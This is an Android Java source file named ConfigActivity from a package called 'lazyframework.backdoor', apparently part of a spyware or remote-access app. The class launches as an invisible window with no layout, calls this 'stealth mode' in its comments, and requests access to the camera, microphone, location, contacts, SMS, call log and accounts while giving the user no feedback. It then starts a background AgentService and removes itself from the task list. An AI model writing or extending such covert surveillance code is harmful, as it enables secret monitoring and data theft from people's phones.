package com.lazyframework.backdoor;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.WindowManager;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class ConfigActivity extends AppCompatActivity {

    private static final String TAG = "ConfigActivity";
    private static final String PREFS_NAME = "LazyFramework";

    private SharedPreferences prefs;
    private Handler mainHandler;
    private boolean isFinished = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // ✅ NO setContentView() - COMPLETE STEALTH

        // ✅ Make window completely invisible
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE);
        getWindow().setDimAmount(0f);

        mainHandler = new Handler(Looper.getMainLooper());
        prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);

        Log.d(TAG, "🚀 ConfigActivity started in STEALTH MODE");

        // ✅ Request all permissions silently
        requestAllPermissions();

        // ✅ Start AgentService immediately
        ensureAgentServiceRunning();

        // ✅ Auto-finish after 1.5 seconds
        mainHandler.postDelayed(this::finishStealth, 1500);
    }

    private void ensureAgentServiceRunning() {
        try {
            Intent serviceIntent = new Intent(this, AgentService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            Log.d(TAG, "✅ AgentService started from ConfigActivity");
        } catch (Exception e) {
            Log.e(TAG, "Failed to start service: " + e.getMessage());
        }
    }

    private void finishStealth() {
        if (isFinished) return;
        isFinished = true;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            finishAndRemoveTask();
        } else {
            finish();
        }
        Log.d(TAG, "ConfigActivity finished (stealth)");
    }

    private void requestAllPermissions() {
        String[] perms = {
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.GET_ACCOUNTS
        };
        ActivityCompat.requestPermissions(this, perms, 999);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        // Silent - no UI feedback
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        mainHandler.removeCallbacksAndMessages(null);
        Log.d(TAG, "ConfigActivity destroyed");
    }
}